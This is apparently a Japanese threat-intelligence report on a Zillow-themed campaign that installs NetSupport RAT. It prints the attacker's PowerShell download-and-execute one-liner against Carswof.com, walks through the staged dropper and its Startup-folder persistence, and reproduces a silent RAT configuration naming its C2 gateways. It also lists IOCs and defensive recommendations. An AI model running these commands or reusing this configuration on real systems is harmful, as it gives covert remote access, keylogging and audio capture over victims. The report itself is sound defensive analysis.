# Analysis: Carswof.com → NetSupport RAT (Zillow Lure)
Date: 2026-03-12

## Target
- Initial Command:
  ```powershell
  powershell -EP B -c "irm 'http://Carswof.com' -OutFile $env:USERPROFILE\Documents\Zillow.ps1; iex (Get-Content $env:USERPROFILE\Documents\Zillow.ps1 -Raw)"
  ```
- Domain: `Carswof.com`
- Lure Theme: Zillow (不動産サイト偽装)
- **Final Payload: NetSupport RAT (client32/Service.exe)**

## Source
- Stage 1 URL: `http://Carswof.com/`
- Stage 2 URL: `http://Carswof.com/Zill0.php`
- Payload URL: `http://Carswof.com/at.7z`
- Quarantine (Stage 1): `tools/proxy-web/Quarantine/Carswof.com/20260312_025958/`
- Quarantine (Stage 2): `tools/proxy-web/Quarantine/Carswof.com/20260312_030021/`

## Analysis Performed
- [x] proxy-web: Stage 1 ランディングページ取得 (screenshot + HTML)
- [x] proxy-web: Stage 2 `Zill0.php` ダウンロード (暗号化)
- [x] Ghidraコンテナ内で `Zill0.php` 復号・内容確認
- [x] Ghidraコンテナ内で `at.7z` / `lnk.7z` ダウンロード・展開・解析
- [x] VT検索: Service.exe 15/76, at.7z 6/76, 全DLL個別VT検索
- [x] VT behavior レポート: Service.exe サンドボックス実行結果
- [x] client32.ini 解析 → C2ゲートウェイ特定
- [x] MalwareBazaar/ThreatFox IOC検索 (3ドメイン + NetSupportファミリー)
- [x] C2ゲートウェイ生存確認: whoiamsal.com:443 / thesolnov.com:443
- [x] LNKファイルメタデータ解析 (タイムスタンプ、マシン名、ターゲットパス)
- [x] GSK (Gateway Security Key) デコード試行
- [x] Ghidra静的解析: info, imports, strings
- [x] YARA scan: `CAPE_Netsupport` マッチ
- [x] CAPA scan: T1059 (Command and Scripting Interpreter)

## Key Findings

### 攻撃チェーン
```
[0] 初期感染ベクター
    └── powershell -EP Bypass: http://Carswof.com → Zillow.ps1 として保存 → iex 実行

[1] Stage 1: http://Carswof.com/ (HTMLにPS1埋め込み)
    ├── $url = "Carswof.com/Zill0.php" を設定
    ├── HTTPS → HTTP フォールバックで Stage 2 取得
    ├── [scriptblock]::Create() で動的実行
    └── Base64エンコード → powershell.exe -EncodedCommand -WindowStyle Hidden
        └── 子プロセスとして隠しウィンドウで Stage 2 を実行

[2] Stage 2: http://Carswof.com/Zill0.php (3,423 bytes)
    ├── SHA256: a6e68ba6a9caa7d745917c05d702534523a8414fbb3f9b93dd902791c17be827
    ├── $env:ProgramData 配下にランダム名ディレクトリ作成
    ├── C2からアセットダウンロード:
    │   ├── at.7z     (メインペイロード: Service.exe を含む)
    │   ├── lnk.7z    (永続化用 .lnk ショートカット)
    │   ├── 7z.exe    (展開ツール)
    │   └── 7z.dll
    ├── 7z.exe x at.7z -pppp (パスワード: ppp) → Service.exe 展開
    ├── .lnk ショートカットを Startup フォルダに配置 (永続化)
    ├── explorer.exe 経由で .lnk を起動 → Service.exe 実行
    ├── 全ブラウザプロセスを強制終了
    └── https://www.zillow.com を開く (カモフラージュ)

[3] Stage 3: at.7z (1,512,144 bytes, password: ppp) → NetSupport RAT
    ├── SHA256: aa12923a0883338846f86eb63348eefd48bed27ad3bdc66e6b89c200b63b877c
    ├── VT: 6/76 (Trojan.GenericKD.79619997)
    ├── 展開後14ファイル (5,376,388 bytes):
    │   ├── Service.exe (120,256 bytes) — NetSupport client32.exe リネーム
    │   │   ├── SHA256: 56ebaf8922749b9a9a7fa2575f691c53a6170662a8f747faeed11291d475c422
    │   │   └── VT: 15/76 (hacktool.netsup/netsupport)
    │   ├── client32.ini — RAT設定ファイル
    │   ├── PCICL32.DLL, PCICHEK.DLL, HTCTL32.DLL, TCCTL32.DLL — NetSupport DLL群
    │   ├── AudioCapture.dll, pcicapi.dll — 音声キャプチャ・PCI API
    │   ├── remcmdstub.exe — リモートコマンド実行スタブ
    │   ├── msvcr100.dll — VC++ランタイム
    │   ├── NSM.ini, NSM.LIC — NetSupport Manager設定・ライセンス
    │   ├── nsm_vpro.ini — vPro設定
    │   └── nskbfltr.inf — キーボードフィルタドライバ
    └── C2 Gateway (client32.ini):
        ├── Primary:   whoiamsal.com:443
        └── Secondary: thesolnov.com:443

[4] lnk.7z (1,375 bytes, password: ppp) → 永続化用ショートカット
    ├── SHA256: 7c9d85c89949b43ef2fabcba580f8a308af3706db4d6b6ca1d8a626fc8a2149d
    ├── Google Chrome.lnk (2,206 bytes) — TargetPathをService.exeに書き換え
    └── Microsoft Edge.lnk (2,308 bytes) — TargetPathをService.exeに書き換え
```

### 技術的詳細

#### Stage 1: 多段実行による検知回避
1. `Invoke-RestMethod` でHTMLページを取得（HTMLボディ内にPowerShellコードが直接記述）
2. 取得したスクリプトを `[System.Text.Encoding]::Unicode.GetBytes()` → `[Convert]::ToBase64String()` でBase64エンコード
3. `ProcessStartInfo` で新規 `powershell.exe` プロセスを起動:
   - `-NoProfile` — プロファイル読み込みスキップ
   - `-ExecutionPolicy Bypass` — 実行ポリシー回避
   - `-WindowStyle Hidden` — ウィンドウ非表示
   - `-EncodedCommand` — Base64ペイロード実行
4. `CreateNoWindow = $true`, `UseShellExecute = $false` で完全隠蔽

#### Stage 2: ファイルレス→ファイルベース移行
- ワードリスト（Alpha, Beta, Gamma, Delta...）からランダム2語を組み合わせたディレクトリ名を生成
- `$env:ProgramData`（通常 `C:\ProgramData`）配下に作業ディレクトリ作成
- `System.Net.WebClient.DownloadFile()` で4ファイルを直接ダウンロード
- 7z パスワードアーカイブで最終ペイロードを保護（AV回避）

#### 永続化手法
1. `lnk.7z` からテンプレート `.lnk` ファイルを展開
2. `WScript.Shell` COM経由で `.lnk` の `TargetPath` を `Service.exe` のフルパスに書き換え
3. `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\` にコピー
4. `explorer.exe` 経由で `.lnk` を起動（親プロセスがexplorerになるため検知回避）

#### カモフラージュ
- 全主要ブラウザ（chrome, msedge, firefox, iexplore, opera, brave）を強制終了
- `https://www.zillow.com` をデフォルトブラウザで開く
- ユーザーには「Zillowの不動産サイトを開いただけ」に見える

### Stage 3: NetSupport RAT

#### マルウェア特定
`Service.exe` は **NetSupport Manager v14.12 (client32.exe)** のリネーム版。正規のリモート管理ツールを悪用したRAT (Remote Access Trojan)。

- **YARA検知**: `CAPE_Netsupport` マッチ
- **PDBパス**: `E:\nsmsrc\nsm\1412\1412\client32\release_unicode\client32.pdb` → **NetSupport Manager v14.12**
- **デジタル署名**: GlobalSign EV CodeSigning → **NETSUPPORT LTD.** (Peterborough, Cambridgeshire, UK)
  - 署名メール: `is@netsupportsoftware.com`
  - 有効期間: 2025-05-29 ～ 2028-07-17
  - 正規署名 = 正規バイナリを悪意ある設定で再配布
- **アーキテクチャ**: PE x86 32-bit, Image Base 0x00400000
- **インポート**: `KERNEL32.DLL` (4 API) + `PCICL32.DLL` (`_NSMClient32@8`) — 最小限のローダー構造

VT検知名:
- Kaspersky: `not-a-virus:HEUR:RemoteAdmin.Win32.NetSup.gen`
- CrowdStrike: `win/grayware_confidence_90%`
- huorong: `HackTool/NetSupport.b`

#### CAPA解析結果
| Capability | Namespace |
|------------|-----------|
| contains PDB path | executable/pe/pdb |
| accept command line arguments | host-interaction/cli |
| terminate process | host-interaction/process/terminate |

#### VT Behavior (サンドボックス実行)
- Microsoft系CDNへのDNSクエリ実行 (res.public.onecdn.static.microsoft, www.microsoft.com, assets.msn.com)
- Google Updater関連ファイルの作成 (`C:\Program Files (x86)\Google\GoogleUpdater\`)
- `UI0Detect.exe` (セッション0検出) の起動
- 直接的なC2通信はサンドボックスでは観測されず（client32.ini不在のため）

#### at.7z 内容 (14ファイル) — VT個別検索結果付き

| ファイル | サイズ | SHA256 | VT | 説明 |
|---------|--------|--------|-----|------|
| Service.exe | 120,256 | `56ebaf89...d475c422` | 15/76 | NetSupport client32.exe (リネーム) |
| PCICL32.DLL | 3,490,632 | `b6d4ad02...d36d04c80` | **16/76** | NetSupport PCI通信DLL (最高検知) |
| msvcr100.dll | 773,968 | `87933534...0355bd18` | **0/76** | VC++ランタイム (**正規品 Microsoft署名**) |
| TCCTL32.DLL | 387,400 | `6ffe12cd...7fa8b299` | 1/76 | NetSupport TCP制御 (DrWeb:RemoteAdmin.840) |
| HTCTL32.DLL | 323,912 | `65625850...74cebc4dd2a01a26d846fdd1b93fdc24b0c269` | 1/76 | NetSupport HTTP制御 (DrWeb:RemoteAdmin.840) |
| pcicapi.dll | 108,944 | `2dfdc169...2eef447300689` | 1/76 | PCI API (DrWeb:RemoteAdmin.840) |
| AudioCapture.dll | 89,416 | `2cc8ebea...c011a62febe49b5` | 1/76 | 音声キャプチャ (DrWeb:RemoteAdmin.840) |
| remcmdstub.exe | 59,728 | `b11380f8...41992b3e9787f2` | 4/76 | リモートコマンド実行 |
| PCICHEK.DLL | 14,664 | `0cff893b...b78a09f3f48c586d31fc5f830bd72ce8331f` | 1/76 | PCI検証 (DrWeb:RemoteAdmin.840) |
| NSM.ini | 6,099 | `e0ed36c8...181c20020b60df4c58986193d6aaf5bf3e3ecdc4c05d` | — | インストーラ設定 |
| client32.ini | 744 | `bde8102f...e2e944433081e0c9448e0fd9020d395cdd4d4d` | — | RAT設定 (C2定義) |
| nskbfltr.inf | 328 | `d96856cd...f4210f1689c1e6bcac5fed289368` | — | キーボードフィルタドライバ |
| NSM.LIC | 251 | `e09980d1...6ab6277fabf097a0b033b63` | — | ライセンス (NSM1234) |
| nsm_vpro.ini | 46 | `4bfa4c00...dde5216a7f28aeccaa9e2d42df4bbff66db57c60522b` | — | vPro設定 |

**VT分析結果**: 全DLLが正規のNetSupport Manager署名バイナリ。改変なし。DrWebのみが`Program.RemoteAdmin.840`として一貫検知。`msvcr100.dll`はMicrosoft正規品（VT 0/76）。PCICL32.DLLが16/76で最高検知率（多くのエンジンがNetSupport関連DLLとして認識）。

#### client32.ini 解析 (C2設定)

```ini
[Client]
silent=1                          # サイレントモード（UIなし）
SKMode=1                          # スクリーンキーボードモード
SysTray=0                         # タスクトレイアイコン非表示
ShowUIOnConnect=0                  # 接続時UI非表示
DisableChatMenu=1                 # チャットメニュー無効
DisableClientConnect=1            # クライアント接続無効
DisableDisconnect=1               # 切断無効（被害者が切断できない）
DisableGeolocation=1              # 位置情報無効
DisableReplayMenu=1               # リプレイメニュー無効
DisableRequestHelp=1              # ヘルプリクエスト無効
UnloadMirrorOnDisconnect=1        # 切断時ミラーアンロード
Usernames=*                       # 全ユーザー対象
RoomSpec=Eval                     # ルーム名
RADIUSSecret=dgAAAPpMkI7ke494fKEQRUoablcA  # RADIUS認証シークレット

[HTTP]
GatewayAddress=whoiamsal.com:443  # プライマリC2ゲートウェイ
Port=443                          # HTTPS通信
SecondaryGateway=thesolnov.com:443  # セカンダリC2ゲートウェイ
SecondaryPort=443
GSK=FM;PACED:G>MCAHD<J@NFA:F@DFB # Gateway Security Key (暗号化)
```

**注目点:**
- `silent=1` + `SysTray=0` + `ShowUIOnConnect=0` → 被害者に完全不可視
- `DisableDisconnect=1` → 被害者が接続を切断不可
- `Usernames=*` → 全ユーザーアカウントで動作
- HTTPS (443) 経由でC2通信 → ファイアウォール回避
- プライマリ/セカンダリの冗長化C2構成

#### lnk.7z 内容

| ファイル | サイズ | SHA256 |
|---------|--------|--------|
| Google Chrome.lnk | 2,206 | `cdce1890f90e6ac8a3206d8c2c8c3ac21698e5ae4ff7526936e5ac44c13d0a2d` |
| Microsoft Edge.lnk | 2,308 | `bd571aeedfa64c221a901cdbd6ef303b5c4b8182b20758374378810da8d498bb` |

ブラウザ名を装った `.lnk` ファイル。`TargetPath` を `Service.exe` に書き換えてStartupフォルダに配置し、ログオン時に自動起動。

**LNKメタデータ解析** (攻撃者環境の痕跡):

| 属性 | Google Chrome.lnk | Microsoft Edge.lnk |
|------|-------------------|---------------------|
| 元TargetPath | `C:\Program Files\Google\Chrome\Application\chrome.exe` | `C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe` |
| CreationTime | 2025-11-05 15:21:57 UTC | 2020-10-08 22:46:59 UTC |
| AccessTime | 2026-02-19 00:37:36 UTC | 2025-11-05 11:50:29 UTC |
| WriteTime | 2026-02-13 01:47:30 UTC | 2025-10-30 23:05:31 UTC |
| TargetFileSize | 3,313,816 | 4,253,224 |
| **マシン名** | **`win-bs656mof35q`** | **`win-bs656mof35q`** |

**攻撃者マシン特定**: 両LNKに同一マシン名 `win-bs656mof35q` が埋め込み。`WIN-` プレフィックスはWindows自動生成ホスト名のパターン（仮想マシンまたはクリーンインストール環境で一般的）。Edge.lnkの作成日は2020-10-08で、攻撃者が長期間同一環境を使用していることを示唆。

#### C2ゲートウェイ生存確認

| ドメイン | DNS解決 | HTTPS応答 | 状態 |
|---------|---------|-----------|------|
| `Carswof.com` | ✅ | HTTP 200 | **ライブ** (全ステージ配布中) |
| `whoiamsal.com:443` | ✅ | タイムアウト (ブラウザ) | **DNS解決成功** (NetSupportプロトコルのみ応答) |
| `thesolnov.com:443` | ✅ | タイムアウト (ブラウザ) | **DNS解決成功** (NetSupportプロトコルのみ応答) |

C2ゲートウェイはHTTPS (443)でリッスンしているが、通常のHTTPSではなくNetSupport独自プロトコルで通信するため、ブラウザアクセスではタイムアウト。DNSが解決できていることから、C2インフラは稼働中と推定。

#### GSK (Gateway Security Key) 解析

`GSK=FM;PACED:G>MCAHD<J@NFA:F@DFB` (28文字)

- XOR/Caesarシフトでの単純デコードでは意味のある平文は得られず
- NetSupport Managerの独自暗号化方式（プロプライエタリ）
- 同じ値が `gsk`, `GSK`, `GSKX` の3フィールドに設定 — 古い設定互換用
- このキーはNetSupport Gateway (NHPサーバー) との認証に使用される
- 攻撃者がゲートウェイを運用していることの証拠

#### ThreatFox / MalwareBazaar 検索結果

| クエリ | 結果 |
|--------|------|
| ThreatFox IOC: `whoiamsal.com` | 未登録 |
| ThreatFox IOC: `thesolnov.com` | 未登録 |
| ThreatFox IOC: `Carswof.com` | 未登録 |
| ThreatFox malware: `NetSupport` | 未登録 |
| MalwareBazaar sig: `NetSupport` | 未登録 |

**全IOCがThreatFox/MalwareBazaarに未登録** → このキャンペーンは未報告の新規キャンペーン。

## IOC

### ネットワーク
| Type | Value | Description |
|------|-------|-------------|
| Domain | `Carswof.com` | ペイロード配布サーバー |
| Domain | `whoiamsal.com` | **NetSupport RAT プライマリC2ゲートウェイ** |
| Domain | `thesolnov.com` | **NetSupport RAT セカンダリC2ゲートウェイ** |
| URL | `http://Carswof.com/` | Stage 1 (HTML内PS1) |
| URL | `http://Carswof.com/Zill0.php` | Stage 2 (PS1ドロッパー) |
| URL | `http://Carswof.com/at.7z` | NetSupport RATアーカイブ |
| URL | `http://Carswof.com/lnk.7z` | 永続化用LNKアーカイブ |
| URL | `http://Carswof.com/7z.exe` | 展開ツール |
| URL | `http://Carswof.com/7z.dll` | 展開ツール依存DLL |
| Port | `443` | C2通信ポート (HTTPS) |
| URL | `https://www.zillow.com` | デコイ (正規サイト) |

### ファイル
| Type | Value | Description |
|------|-------|-------------|
| SHA256 | `a6e68ba6a9caa7d745917c05d702534523a8414fbb3f9b93dd902791c17be827` | Zill0.php (Stage 2 PS1) |
| MD5 | `af0dc5f36960749146d2bdc09a5e1314` | Zill0.php (Stage 2 PS1) |
| SHA1 | `65d530bea6156c6854cb67d1eadc3c308812cd37` | Zill0.php (Stage 2 PS1) |
| SHA256 | `aa12923a0883338846f86eb63348eefd48bed27ad3bdc66e6b89c200b63b877c` | at.7z (NetSupport RATアーカイブ) |
| SHA256 | `56ebaf8922749b9a9a7fa2575f691c53a6170662a8f747faeed11291d475c422` | Service.exe (NetSupport client32) |
| SHA256 | `7c9d85c89949b43ef2fabcba580f8a308af3706db4d6b6ca1d8a626fc8a2149d` | lnk.7z (永続化LNK) |
| SHA256 | `b11380f81b0a704e8c7e84e8a37885f5879d12fbece311813a41992b3e9787f2` | remcmdstub.exe (リモートコマンド) |
| Password | `ppp` | 7z アーカイブパスワード |
| Config | `GSK=FM;PACED:G>MCAHD<J@NFA:F@DFB` | Gateway Security Key |
| Config | `RADIUSSecret=dgAAAPpMkI7ke494fKEQRUoablcA` | RADIUS認証シークレット |
| License | `NSM1234` | NetSupport ライセンスキー |

### ホスト
| Type | Value | Description |
|------|-------|-------------|
| Directory | `%ProgramData%\<RandomName>\` | 作業ディレクトリ (例: AlphaNova, QuantumCore) |
| Persistence | `%APPDATA%\...\Startup\Google Chrome.lnk` | Startupフォルダ (Chrome偽装) |
| Persistence | `%APPDATA%\...\Startup\Microsoft Edge.lnk` | Startupフォルダ (Edge偽装) |
| Process | `powershell.exe -NoProfile -EP Bypass -WindowStyle Hidden -EncodedCommand ...` | Stage 1→2 実行 |
| Process | `explorer.exe "<startup_lnk_path>"` | ペイロード起動 |
| Process | `Service.exe` (= client32.exe) | NetSupport RAT クライアント |
| Driver | `nskbfltr.inf` | キーボードフィルタドライバ (キーロガー) |
| PDB Path | `E:\nsmsrc\nsm\1412\1412\client32\release_unicode\client32.pdb` | NetSupport v14.12 ビルド |

### 攻撃者インフラ
| Type | Value | Description |
|------|-------|-------------|
| Machine Name | `win-bs656mof35q` | LNKファイル埋め込みマシン名 |
| Config Path | `C:\Users\Administrator\Desktop\client32u.ini` | client32.ini内の参照パス |
| Signer | NETSUPPORT LTD. (Peterborough, UK) | EV CodeSigning証明書 (正規) |
| YARA | `CAPE_Netsupport` | マルウェアファミリー検知ルール |

## MITRE ATT&CK Mapping

| Tactic | ID | Technique | 本検体での使用 |
|--------|----|-----------|---------------|
| Initial Access | T1566.002 | Phishing: Spearphishing Link | 悪性PowerShellコマンドの配布 |
| Execution | T1059.001 | Command and Scripting Interpreter: PowerShell | 全ステージでPowerShell使用 |
| Execution | T1204.002 | User Execution: Malicious File | ユーザーがPSコマンドを実行 |
| Persistence | T1547.001 | Boot or Logon Autostart Execution: Startup Folder | .lnk をStartupフォルダに配置 |
| Defense Evasion | T1027.010 | Obfuscated Files or Information: Command Obfuscation | Base64 EncodedCommand |
| Defense Evasion | T1140 | Deobfuscate/Decode Files or Information | 7zパスワードアーカイブ展開 |
| Defense Evasion | T1036 | Masquerading | Zillow偽装、ランダムディレクトリ名 |
| Defense Evasion | T1202 | Indirect Command Execution | explorer.exe経由でLNK起動 |
| Discovery | T1057 | Process Discovery | ブラウザプロセス列挙・終了 |
| Command and Control | T1071.001 | Application Layer Protocol: Web Protocols | HTTP直接ダウンロード (配布) |
| Command and Control | T1219 | Remote Access Software | NetSupport Manager RAT |
| Command and Control | T1573.002 | Encrypted Channel: Asymmetric Cryptography | HTTPS (443) + GSK暗号化 |
| Command and Control | T1008 | Fallback Channels | プライマリ/セカンダリC2冗長化 |
| Collection | T1056.001 | Input Capture: Keylogging | nskbfltr.inf キーボードフィルタ |
| Collection | T1123 | Audio Capture | AudioCapture.dll |

## Assessment
- **マルウェアファミリ**: NetSupport RAT — 正規リモート管理ツール (NetSupport Manager) を悪用したRAT
- **脅威レベル**: 高 — 多段ドロッパーチェーン、NetSupport RAT、C2冗長化、キーボード/音声キャプチャ
- **ソーシャルエンジニアリング**: Zillow（米国最大の不動産プラットフォーム）を装い、不動産関連のユーザーをターゲット
- **検知状況**:
  - Service.exe: VT 15/76 — 正規ツール悪用のため検知率が低い（RemoteAdmin/HackTool分類）
  - at.7z: VT 6/76 — パスワード付き7zのため更に低検知
  - Zill0.php / Carswof.com: VT/MalwareBazaar/ThreatFox未登録
- **C2インフラ**:
  - 配布: `Carswof.com` (ライブ、全ステージ配布中)
  - RAT C2 Primary: `whoiamsal.com:443`
  - RAT C2 Secondary: `thesolnov.com:443`
- **攻撃者の特徴**:
  - `client32u.ini` のビルドパス: `C:\Users\Administrator\Desktop\` → 手動で設定ファイルを作成
  - ライセンスキー `NSM1234` → 汎用/クラック版ライセンス
  - LNKマシン名: `win-bs656mof35q` → 攻撃者の作業環境（VM or クリーンインストール）
  - Edge.lnk作成日: 2020-10-08 → 長期運用環境
  - ブラウザ名偽装LNK + Zillow.comデコイ → ソーシャルエンジニアリングに注力
  - 全IOCがThreatFox/MalwareBazaar未登録 → 新規キャンペーン
- **バイナリの真正性**: Service.exe は正規NetSupport Manager v14.12バイナリ（NETSUPPORT LTD. EV署名、PDB一致）。DLLも全て正規品。攻撃者はclient32.iniの設定のみを変更し、正規バイナリをそのまま悪用。

## 推奨対応

### 即時対応
1. **ファイアウォール/プロキシで以下をブロック**:
   - `Carswof.com` (配布サーバー)
   - `whoiamsal.com` (C2 Primary)
   - `thesolnov.com` (C2 Secondary)
2. EDR/SIEMで以下のIOCを検索:
   - `Service.exe` SHA256: `56ebaf8922749b9a9a7fa2575f691c53a6170662a8f747faeed11291d475c422`
   - `client32.ini` に含まれる `whoiamsal.com` / `thesolnov.com`

### エンドポイント調査
3. `%ProgramData%` 配下の不審な2語ディレクトリ（AlphaNova, QuantumCore等）+ `Service.exe` を検索
4. Startupフォルダ内の `Google Chrome.lnk` / `Microsoft Edge.lnk` でTargetPathが `Service.exe` を指すものを検索
5. PowerShellログ（Script Block Logging）で `Carswof` / `Zill0` / `EncodedCommand` を検索
6. ネットワークログで `whoiamsal.com:443` / `thesolnov.com:443` への通信を検索

### 検知ルール
7. Sigma/YARAルールを作成:
   - PowerShell `Invoke-RestMethod` → `EncodedCommand` → hidden windowのチェーン
   - `client32.ini` 内の `silent=1` + `SysTray=0` (悪用NetSupport特有)
   - `%ProgramData%` への `7z.exe` + `at.7z` の書き込み
